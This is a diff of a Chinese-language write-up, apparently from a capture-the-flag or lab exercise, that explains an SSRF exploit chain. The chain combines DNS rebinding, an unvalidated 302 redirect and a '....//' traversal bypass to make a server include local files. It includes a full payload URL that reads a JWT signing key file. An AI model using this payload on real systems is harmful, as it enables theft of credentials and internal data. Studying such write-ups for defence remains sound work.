@@ -4,12 +4,12 @@
 
 ## 一句话概括
 
-一个"远程导入"功能：`index.php` 把用户提交的 URL 交给 `file_get_contents` 抓取，URL 校验依赖域名解析出的 IP，而跳转后的目标不再校验。于是用 DNS Rebinding 让域名先解析成公网 IP（过校验）、再解析成 `127.0.0.1`（绕过 IP 黑名单），经一个开放的 302 跳转接口，触发服务器**自己**去访问仅监听回环的 `preview.php`，再用 `....//` 绕过目录穿越过滤，最终 `include` 任意文件——内部资源以 zip 归档形式下载到攻击者手里。
+基于 TOCTOU 的 SSRF：**check**（校验 URL 时域名解析成公网 IP，顺利放行）与 **use**（实际抓取时同一域名解析成 `127.0.0.1`）之间存在时间差，两次 DNS 解析结果不同——校验看的是"门口"，攻击打的是"屋里"。再借 302 跳转后不重验、`....//` 绕过目录穿越，最终让服务器自己 `include` 任意文件并以 zip 归档回传。
 
-## 唯一的 Payload
+## 关键 Payload
 
 ```
-http://momo77.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key
+http://<任意的字符串_p>.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key
 ```
 
 解码后就是两次请求拼接：
